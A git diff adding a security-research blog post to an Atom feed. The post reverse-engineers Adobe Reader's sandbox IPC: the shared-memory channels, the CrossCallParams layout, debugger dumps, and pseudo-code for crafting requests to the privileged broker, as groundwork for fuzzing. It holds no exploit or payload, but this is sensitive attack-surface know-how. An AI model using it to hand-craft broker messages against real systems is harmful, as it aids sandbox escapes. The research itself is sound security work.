@@ -4,7 +4,7 @@
   <title><![CDATA[]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2020-07-02T00:29:10-07:00</updated>
+  <updated>2020-08-10T13:11:36-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,971 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Digging the Adobe Sandbox - IPC Internals]]></title>
+    <link href="http://hatRiot.github.io/blog/2020/08/07/digging-the-adobe-sandbox-internals/"/>
+    <updated>2020-08-07T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2020/08/07/digging-the-adobe-sandbox-internals</id>
+    <content type="html"><![CDATA[<p>This post kicks off a short series into reversing the Adobe Reader sandbox. I initially started this research early last year and have been working on it off and on since. This series will document the Reader sandbox internals, present a few tools for reversing/interacting with it, and a description of the results of this research. There may be quite a bit of content here, but I&rsquo;ll be doing a lot of braindumping. I find posts that document process, failure, and attempt to be far more insightful as a researcher than pure technical result.</p>
+
+<p>I&rsquo;ve broken this research up into two posts. Maybe more, we&rsquo;ll see. The first here will detail the internals of the sandbox and introduce a few tools developed, and the second will focus on fuzzing and the results of that effort.</p>
+
+<p>This post focuses primarily on the IPC channel used to communicate between the sandboxed process and the broker. I do not delve into how the policy engine works or many of the restrictions enabled.</p>
+
+<h3>Introduction</h3>
+
+<p>This is by no means the first dive into the Adobe Reader sandbox. Here are a few prior examples of great work:</p>
+
+<p><a href="https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/000/058/original/A_Castle_Made_of_Sand-HES_final.pdf">2011 &ndash; A Castle Made of Sand (Richard Johnson)</a><br/>
+<a href="https://docs.huihoo.com/blackhat/usa-2011/BH_US_11_SabanalYason_Readerx_Slides.pdf">2011 &ndash; Playing in the Reader X Sandbox (Paul Sabanal and Mark Yason)</a><br/>
+<a href="https://media.blackhat.com/bh-eu-12/Liu_Lovet/bh-eu-12-Liu_Lovet-Sandworms-WP.pdf">2012 &ndash; Breeding Sandworms (Zhenhua Liu and Guillaume Lovet)</a><br/>
+<a href="https://cansecwest.com/slides/2013/Adobe%20Sandbox.pdf">2013 &ndash; When the Broker is Broken (Peter Vreugdenhil)</a></p>
+
+<p><code>Breeding Sandworms</code> was a particularly useful introduction to the sandbox, as it describes in some detail the internals of transaction and how they approached fuzzing the sandbox. I&rsquo;ll detail my approach and improvements in
+part two of this series.</p>
+
+<p>In addition, the ZDI crew of Abdul-Aziz Hariri, et al. have been hammering on
+the Javascript side of things for what seems like forever (<a href="https://www.slideshare.net/codeblue_jp/abusing-adobe-readers-javascript-apis-by-abdulaziz-hariri-brian-gorenc-code-blue-2015">Abusing Adobe Reader&rsquo;s Javascript APIs</a>)
+and have done some great work in this area.</p>
+
+<p>After evaluating existing research, however, it seemed like there was more work to be done in a more open source fashion. Most sandbox escapes in Reader these days opt instead to target Windows itself via win32k/dxdiag/etc and not the sandbox broker. This makes some sense, but leaves a lot of attack surface unexplored.</p>
+
+<p>Note that all research was done on Acrobat Reader DC 20.6.20034 on a Windows 10 machine. You can fetch installers for old versions of Adobe Reader
+<a href="https://www.adobe.com/devnet-docs/acrobatetk/tools/ReleaseNotesDC/index.html">here</a>.
+I highly recommend bookmarking this. One of my favorite things to do on a new target is pull previous bugs and affected versions and run through root cause and exploitation.</p>
+
+<h3>Sandbox Internals Overview</h3>
+
+<p>Adobe Reader&rsquo;s sandbox is known as protected mode and is on by default, but can be toggled on/off via preferences or the registry. Once Reader launches, a child process is spawned under low integrity and a shared memory
+section mapped in. Inter-process communication (IPC) takes place over this channel, with the parent process acting as the broker.</p>
+
+<p>Adobe actually published some of the sandbox source code to Github over 7 years ago, but it does not contain any of their policies or modern tag interfaces. It&rsquo;s useful for figuring out variables and function names during reversing,
+and the source code is well written and full of useful comments, so I recommend <a href="https://github.com/adobe/chromium/tree/master/sandbox">pulling it up</a>.</p>
+
+<p>Reader uses the Chromium sandbox (pre Mojo), and I recommend the following resources for the specifics here:</p>
+
+<ul>
+<li><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md">Official Documentation</a></li>
+<li><a href="https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf">Whitepaper</a></li>
+<li><a href="https://github.com/chromium/chromium/tree/master/sandbox/win/src">Source</a></li>
+<li><a href="https://github.com/allpaca/chrome-sbx-db">allpaca Github repo of sandbox escapes</a></li>
+</ul>
+
+
+<p>These days it&rsquo;s known as the &ldquo;legacy IPC&rdquo; and has been replaced by <a href="https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md">Mojo</a> in Chrome. Reader actually uses Mojo to communicate between its RdrCEF (Chromium Embedded Framework) processes which handle cloud connectivity, syncing, etc. It&rsquo;s possible Adobe plans to replace the  broker legacy API with Mojo at some point, but this has not been announced/released yet.</p>
+
+<p>We&rsquo;ll start by taking a brief look at how a target process is spawned, but the main focus of this post will be the guts of the IPC mechanisms in play. Execution of the child process first begins with <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/broker_services.cc#L276"><code>BrokerServicesBase::SpawnTarget</code></a>.
+This function crafts the target process and its restrictions. Some of these
+are described <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/security_level.h">here</a> in greater detail, but they are as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>1. Create restricted token
+</span><span class='line'> - via `CreateRestrictedToken`
+</span><span class='line'> - Low integrity or AppContainer if available
+</span><span class='line'>2. Create restricted job object
+</span><span class='line'> - No RW to clipboard
+</span><span class='line'> - No access to user handles in other processes
+</span><span class='line'> - No message broadcasts
+</span><span class='line'> - No global hooks
+</span><span class='line'> - No global atoms table access
+</span><span class='line'> - No changes to display settings
+</span><span class='line'> - No desktop switching/creation
+</span><span class='line'> - No ExitWindows calls
+</span><span class='line'> - No SystemParamtersInfo
+</span><span class='line'> - One active process
+</span><span class='line'> - Kill on close/unhandled exception</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From here, the policy manager enforces interceptions, handled by the
+<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/interception.cc">InterceptionManager</a>,
+which handles hooking and rewiring various Win32 functions via the target process to the broker. According to documentation, this is not for security, but rather:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[..] designed to provide compatibility when code inside the sandbox cannot be modified to cope with sandbox restrictions. To save unnecessary IPCs, policy is also evaluated in the target process before making an IPC call, although this is not used as a security guarantee but merely a speed optimization.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From here we can now take a look at how the IPC mechanisms between the target and broker process actually work.</p>
+
+<p>The broker process is responsible for spawning the target process, creating a shared memory mapping, and initializing the requisite data structures. This shared memory mapping is the medium in which the broker and target communicate and exchange data. If the target wants to make an IPC call, the following happens at a high level:</p>
+
+<ol>
+<li>The target finds a channel in a free state</li>
+<li>The target serializes the IPC call parameters to the channel</li>
+<li>The target then signals an event object for the channel (ping event)</li>
+<li>The target waits until a pong event is signaled</li>
+</ol>
+
+
+<p>At this point, the broker executes <code>ThreadPingEventReady</code>, the IPC processor entry point, where the following occurs:</p>
+
+<ol>
+<li>The broker deserializes the call arguments in the channel</li>
+<li>Sanity checks the parameters and the call</li>
+<li>Executes the callback</li>
+<li>Writes the return structure back to the channel</li>
+<li>Signals that the call is completed (pong event)</li>
+</ol>
+
+
+<p>There are 16 channels available for use, meaning that the broker can service up to 16 concurrent IPC requests at a time. The following diagram describes a high level view of this architecture:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2020/high-level-arch.png"></p>
+
+<p>From the broker&rsquo;s perspective, a channel can be viewed like so:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2020/broker-shm-view.png"></p>
+
+<p>In general, this describes what the IPC communication channel between the broker and target looks like. In the following sections we&rsquo;ll take a look at these in more technical depth.</p>
+
+<h3>IPC Internals</h3>
+
+<p>The IPC facilities are established via <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/target_process.cc#L250"><code>TargetProcess::Init</code></a>, and is really what we&rsquo;re most interested in. The following snippet describes how the shared memory mapping is created and established between the broker and target:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  DWORD shared_mem_size = static_cast&lt;DWORD&gt;(shared_IPC_size +
+</span><span class='line'>                                             shared_policy_size);
+</span><span class='line'>  shared_section_.Set(::CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
+</span><span class='line'>                                           PAGE_READWRITE | SEC_COMMIT,
+</span><span class='line'>                                           0, shared_mem_size, NULL));
+</span><span class='line'>  if (!shared_section_.IsValid()) {
+</span><span class='line'>    return ::GetLastError();
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  DWORD access = FILE_MAP_READ | FILE_MAP_WRITE;
+</span><span class='line'>  base::win::ScopedHandle target_shared_section;
+</span><span class='line'>  if (!::DuplicateHandle(::GetCurrentProcess(), shared_section_,
+</span><span class='line'>                         sandbox_process_info_.process_handle(),
+</span><span class='line'>                         target_shared_section.Receive(), access, FALSE, 0)) {
+</span><span class='line'>    return ::GetLastError();
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  void* shared_memory = ::MapViewOfFile(shared_section_,
+</span><span class='line'>                                        FILE_MAP_WRITE|FILE_MAP_READ,
+</span><span class='line'>                                        0, 0, 0);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The calculated <code>shared_mem_size</code> in the source code here comes out to 65536 bytes, which isn&rsquo;t right. The shared section is actually 0x20000 bytes in modern Reader binaries.</p>
+
+<p>Once the mapping is established and policies copied in, the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_server.cc#L46">SharedMemIPCServer</a>
+is initialized, and this is where things finally get interesting. <code>SharedMemIPCServer</code> initializes the ping/pong events for communication, creates channels, and registers callbacks.</p>
+
+<p>The previous architecture diagram provides an overview of the structures and layout of the section at
+runtime. In short, a <code>ServerControl</code> is a broker-side view of an IPC channel. It contains the server side event handles, pointers to both the channel and its buffer, and general information about the connected IPC endpoint. This structure is not visible to the target process and exists only in the broker.</p>
+
+<p>A <code>ChannelControl</code> is the target process version of a <code>ServerControl</code>; it contains the target&rsquo;s event handles, the state of the channel, and information about where to find the channel buffer. This channel buffer is where the <code>CrossCallParams</code> can be found as well as the call return information after a successful IPC dispatch.</p>
+
+<p>Let&rsquo;s walk through what an actual request looks like. Making an IPC request requires the target
+to first prepare a <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L109"><code>CrossCallParams</code></a> structure. This is defined as a class, but we can model it as a struct:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>const size_t kExtendedReturnCount = 8;
+</span><span class='line'>
+</span><span class='line'>struct CrossCallParams {
+</span><span class='line'>  uint32 tag_;
+</span><span class='line'>  uint32 is_in_out_;
+</span><span class='line'>  CrossCallReturn call_return;
+</span><span class='line'>  size_t params_count_;
+</span><span class='line'>};
+</span><span class='line'>
+</span><span class='line'>struct CrossCallReturn {
+</span><span class='line'>  uint32 tag_;
+</span><span class='line'>  uint32 call_outcome;
+</span><span class='line'>  union {
+</span><span class='line'>    NTSTATUS nt_status;
+</span><span class='line'>    DWORD win32_result;
+</span><span class='line'>  };
+</span><span class='line'>
+</span><span class='line'>  HANDLE handle;
+</span><span class='line'>  uint32 extended_count;
+</span><span class='line'>  MultiType extended[kExtendedReturnCount];
+</span><span class='line'>};
+</span><span class='line'>
+</span><span class='line'>union MultiType {
+</span><span class='line'>  uint32 unsigned_int;
+</span><span class='line'>  void* pointer;
+</span><span class='line'>  HANDLE handle;
+</span><span class='line'>  ULONG_PTR ulong_ptr;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;ve also gone ahead and defined a few other structures needed to complete the picture. Note that the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L79">return structure</a>, <code>CrossCallReturn</code>, is embedded within the body of the <code>CrossCallParams</code>.</p>
+
+<p>There&rsquo;s a great ASCII diagram provided in the sandbox source code that&rsquo;s highly instructive, and I&rsquo;ve duplicated it below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// [ tag                4 bytes]
+</span><span class='line'>// [ IsOnOut            4 bytes]
+</span><span class='line'>// [ call return       52 bytes]
+</span><span class='line'>// [ params count       4 bytes]
+</span><span class='line'>// [ parameter 0 type   4 bytes]
+</span><span class='line'>// [ parameter 0 offset 4 bytes] ---delta to ---\
+</span><span class='line'>// [ parameter 0 size   4 bytes]                |
+</span><span class='line'>// [ parameter 1 type   4 bytes]                |
+</span><span class='line'>// [ parameter 1 offset 4 bytes] ---------------|--\
+</span><span class='line'>// [ parameter 1 size   4 bytes]                |  |
+</span><span class='line'>// [ parameter 2 type   4 bytes]                |  |
+</span><span class='line'>// [ parameter 2 offset 4 bytes] ----------------------\
+</span><span class='line'>// [ parameter 2 size   4 bytes]                |  |   |
+</span><span class='line'>// |---------------------------|                |  |   |
+</span><span class='line'>// | value 0     (x bytes)     | &lt;--------------/  |   |
+</span><span class='line'>// | value 1     (y bytes)     | &lt;-----------------/   |
+</span><span class='line'>// |                           |                       |
+</span><span class='line'>// | end of buffer             | &lt;---------------------/
+</span><span class='line'>// |---------------------------|</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A tag is a dword indicating which function we&rsquo;re invoking (just a number between 1 and approximately 255, depending on your version). This is handled server side dynamically, and we&rsquo;ll explore that further later on.</p>
+
+<p>Each parameter is then sequentially represented by a <code>ParamInfo</code> structure:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct ParamInfo {
+</span><span class='line'>  ArgType type_;
+</span><span class='line'>  ptrdiff_t offset_;
+</span><span class='line'>  size_t size_;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The offset is the delta value to a region of memory somewhere below the <code>CrossCallParams</code> structure. This is handled in the Chromium source code via the <code>ptrdiff_t</code> type.</p>
+
+<p>Let&rsquo;s look at a call in memory from the target&rsquo;s perspective. Assume the channel buffer is at <code>0x2a10134</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000+0x134
+</span><span class='line'>02a10134  00000003 00000000 00000000 00000000
+</span><span class='line'>02a10144  00000000 00000000 000002cc 00000001
+</span><span class='line'>02a10154  00000000 00000000 00000000 00000000
+</span><span class='line'>02a10164  00000000 00000000 00000000 00000007
+</span><span class='line'>02a10174  00000001 000000a0 00000086 00000002
+</span><span class='line'>02a10184  00000128 00000004 00000002 00000130
+</span><span class='line'>02a10194  00000004 00000002 00000138 00000004
+</span><span class='line'>02a101a4  00000002 00000140 00000004 00000002</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0x2a10134</code> shows we&rsquo;re invoking tag 3, which carries 7 parameters (<code>0x2a10170</code>).
+The first argument is type 0x1 (we&rsquo;ll describe types later on), is at delta
+offset 0xa0, and is 0x86 bytes in size. Thus:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000+0x134+0xa0
+</span><span class='line'>02a101d4  003f005c 005c003f 003a0043 0055005c
+</span><span class='line'>02a101e4  00650073 00730072 0062005c 0061006a
+</span><span class='line'>02a101f4  006a0066 0041005c 00700070 00610044
+</span><span class='line'>02a10204  00610074 004c005c 0063006f 006c0061
+</span><span class='line'>02a10214  006f004c 005c0077 00640041 0062006f
+</span><span class='line'>02a10224  005c0065 00630041 006f0072 00610062
+</span><span class='line'>02a10234  005c0074 00430044 0052005c 00610065
+</span><span class='line'>02a10244  00650064 004d0072 00730065 00610073
+</span><span class='line'>0:009&gt; du 2a10000+0x134+0xa0
+</span><span class='line'>02a101d4  "\??\C:\Users\bjaff\AppData\Local"
+</span><span class='line'>02a10214  "Low\Adobe\Acrobat\DC\ReaderMessa"
+</span><span class='line'>02a10254  "ges"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This shows the delta of the parameter data and, based on the parameter type, we know it&rsquo;s a unicode string.</p>
+
+<p>With this information, we can craft a buffer targeting IPC tag 3 and move onto
+sending it. To do this, we require the
+<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_client.h#L87"><code>IPCControl</code></a>
+structure. This is a simple structure defined at the start of the IPC shared memory section:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct IPCControl {
+</span><span class='line'>    size_t channels_count;
+</span><span class='line'>    HANDLE server_alive;
+</span><span class='line'>    ChannelControl channels[1];
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And in the IPC shared memory section:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:009&gt; dd 2a10000
+</span><span class='line'>02a10000  0000000f 00000088 00000134 00000001
+</span><span class='line'>02a10010  00000010 00000014 00000003 00020134</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we have 16 channels, a handle to <code>server_alive</code>, and the start of our
+<code>ChannelControl</code> array.</p>
+
+<p>The <code>server_alive</code> handle is a mutex used to signal if the server has crashed.
+It&rsquo;s used during tag invocation in <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sharedmem_ipc_client.cc#L52"><code>SharedmemIPCClient::DoCall</code></a>, which we&rsquo;ll describe later on. For now, assume that if we <code>WaitForSingleObject</code> on this and it returns <code>WAIT_ABANDONED</code>, the server has crashed.</p>
+
+<p><code>ChannelControl</code> is a structure that describes a channel, and is again defined as:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct ChannelControl {
+</span><span class='line'>  size_t channel_base;
+</span><span class='line'>  volatile LONG state;
+</span><span class='line'>  HANDLE ping_event;
+</span><span class='line'>  HANDLE pong_event;
+</span><span class='line'>  uint32 ipc_tag;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>channel_base</code> describes the channel&rsquo;s buffer, ie. where the <code>CrossCallParams</code> structure can be found. This is an offset from the base of the shared memory section.</p>
+
+<p><code>state</code> is an enum that describes the state of the channel:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>enum ChannelState {
+</span><span class='line'>  kFreeChannel = 1,
+</span><span class='line'>  kBusyChannel,
+</span><span class='line'>  kAckChannel,
+</span><span class='line'>  kReadyChannel,
+</span><span class='line'>  kAbandonnedChannel
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The ping and pong events are, as previously described, used to signal to the opposite endpoint that data is ready for consumption. For example, when the client has written out its <code>CrossCallParams</code> and ready for the server, it signals:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  DWORD wait = ::SignalObjectAndWait(channel[num].ping_event,
+</span><span class='line'>                                     channel[num].pong_event,
+</span><span class='line'>                                     kIPCWaitTimeOut1,
+</span><span class='line'>                                     FALSE);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When the server has completed processing the request, the <code>pong_event</code> is signaled and the client reads back the call result.</p>
+
+<p>A channel is fetched via <code>SharedMemIPCClient::LockFreeChannel</code> and is invoked when <code>GetBuffer</code> is called. This simply identifies a channel in the <code>IPCControl</code> array wherein <code>state == kFreeChannel</code>, and sets it to <code>kBusyChannel</code>. With a
+channel, we can now write out our <code>CrossCallParams</code> structure to the shared memory buffer. Our target buffer begins at <code>channel-&gt;channel_base</code>.</p>
+
+<p>Writing out the <code>CrossCallParams</code> has a few nuances. First, the number of
+actual parameters is NUMBER_PARAMS+1. According to the source:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// Note that the actual number of params is NUMBER_PARAMS + 1
+</span><span class='line'>// so that the size of each actual param can be computed from the difference
+</span><span class='line'>// between one parameter and the next down. The offset of the last param
+</span><span class='line'>// points to the end of the buffer and the type and size are undefined.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This can be observed in the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L225"><code>CopyParamIn</code></a> function:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>param_info_[index + 1].offset_ = Align(param_info_[index].offset_ +
+</span><span class='line'>                                            size);
+</span><span class='line'>param_info_[index].size_ = size;
+</span><span class='line'>param_info_[index].type_ = type;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note the offset written is the offset for <code>index+1</code>. In addition, this offset is aligned. This is a pretty simple function that byte aligns the delta inside the channel buffer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// Increases |value| until there is no need for padding given the 2*pointer
+</span><span class='line'>// alignment on the platform. Returns the increased value.
+</span><span class='line'>// NOTE: This might not be good enough for some buffer. The OS might want the
+</span><span class='line'>// structure inside the buffer to be aligned also.
+</span><span class='line'>size_t Align(size_t value) {
+</span><span class='line'>  size_t alignment = sizeof(ULONG_PTR) * 2;
+</span><span class='line'>    return ((value + alignment - 1) / alignment) * alignment;
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because the Reader process is x86, the alignment is always 8.</p>
+
+<p>The pseudo-code for writing out our <code>CrossCallParams</code> can be distilled into the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>write_uint(buffer,     tag);
+</span><span class='line'>write_uint(buffer+0x4, is_in_out);
+</span><span class='line'>
+</span><span class='line'>// reserve 52 bytes for CrossCallReturn
+</span><span class='line'>write_crosscall_return(buffer+0x8);
+</span><span class='line'>
+</span><span class='line'>write_uint(buffer+0x3c, param_count);
+</span><span class='line'>
+</span><span class='line'>// calculate initial delta 
+</span><span class='line'>delta = ((param_count + 1) * 12) + 12 + 52;
+</span><span class='line'>
+</span><span class='line'>// write out the first argument's offset 
+</span><span class='line'>write_uint(buffer + (0x4 * (3 * 0 + 0x11)), delta);
+</span><span class='line'>
+</span><span class='line'>for idx in range(param_count):
+</span><span class='line'>    
+</span><span class='line'>    write_uint(buffer + (0x4 * (3 * idx + 0x10)), type);
+</span><span class='line'>    write_uint(buffer + (0x4 * (3 * idx + 0x12)), size);
+</span><span class='line'>
+</span><span class='line'>    // ...write out argument data. This varies based on the type
+</span><span class='line'>
+</span><span class='line'>    // calculate new delta
+</span><span class='line'>    delta = Align(delta + size)
+</span><span class='line'>    write_uint(buffer + (0x4 * (3 * (idx+1) + 0x11)), delta);
+</span><span class='line'>
+</span><span class='line'>// finally, write the tag out to the ChannelControl struct
+</span><span class='line'>write_uint(channel_control-&gt;tag, tag);</span></code></pre></td></tr></table></div></figure>
+
+
